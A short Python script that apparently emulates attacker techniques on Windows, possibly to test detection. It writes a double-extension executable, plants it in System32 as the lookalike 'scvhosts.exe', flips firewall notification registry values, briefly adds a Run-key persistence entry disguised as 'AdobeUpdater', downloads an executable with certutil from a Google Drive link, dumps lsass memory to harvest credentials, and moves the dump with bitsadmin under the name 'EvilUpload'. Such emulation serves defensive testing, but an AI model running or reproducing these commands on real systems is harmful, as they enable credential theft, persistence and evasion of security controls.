import os
import requests
import shutil
import subprocess
from winregistry import WinRegistry as Reg

# double extension file written to disk
f = open("c:\\users\\public\\document.docx.exe", "w")
f.write('woho')
f.close()

# Move file to windows root directory
shutil.move("c:\\users\\public\\document.docx.exe", "C:\\windows\\system32\\scvhosts.exe")


# disable firewall notifications
reg = Reg()
path = r'HKLM\System\ControlSet001\services\sharedaccess\parameters\firewallpolicy\publicprofile'
reg.read_key(path)
reg.write_value(path, 'DisableNotifications', 0x00000001, 'REG_DWORD')
reg.write_value(path, 'DisableNotifications', 0x00000000, 'REG_DWORD')

# Registry persistence
reg = Reg()
path = r'HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
reg.write_value(path, 'AdobeUpdater', 'C:\\windows\\system32\\scvhosts.exe', 'REG_SZ')
reg.delete_value(path, 'AdobeUpdater')

# certutil download procdump
os.system('certutil.exe -urlcache -f "https://drive.google.com/uc?export=download&id=1Z_uYruXrRMwcWgrj9Z3Us2soikxX4f6f" "c:\\users\\public\\dumpy.exe"')

# dumpy dump lsass
os.system('C:\\Users\\Public\\dumpy.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp')

# transfer results file with bitsadmin
os.system('bitsadmin /transfer "EvilUpload" /upload /priority normal \\\\localhost\\c$\\done.dump c:\\users\\public\\lsass.dmp"')
x = requests.get('https://www.dropbox.com', verify=False)